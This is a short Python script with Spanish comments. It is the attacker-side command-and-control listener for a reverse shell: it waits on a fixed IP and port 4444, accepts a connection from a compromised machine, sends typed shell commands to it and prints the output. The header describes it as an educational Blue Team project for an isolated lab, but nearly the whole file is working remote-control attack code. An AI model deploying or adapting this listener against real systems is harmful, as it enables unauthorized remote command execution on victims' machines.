#!/usr/bin/env python3
# =============================================================================
# C2 SERVER - LADO DEL ATACANTE (Command & Control)
# PROPÓSITO: Proyecto educativo de seguridad defensiva (Blue Team)
# ADVERTENCIA: Solo usar en laboratorio aislado propio
# =============================================================================

#!/usr/bin/env python3
import socket

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Esperando Conexiones")
        self.connection, address = listener.accept()
        print("[+] Tenemos una conexion de " + str(address))
    
    def ejecutarRemoto(self, command):
        self.connection.send(command.encode('utf-8'))
        return self.connection.recv(1024000)
    
    def run(self):
        while True:
            command = input("shell »» ")
            if command == "salir":
                self.connection.close()
                exit()
            result = self.ejecutarRemoto(command)
            print(result.decode('utf-8', errors='ignore'))

escuchar = Listener("192.168.1.33", 4444)
escuchar.run()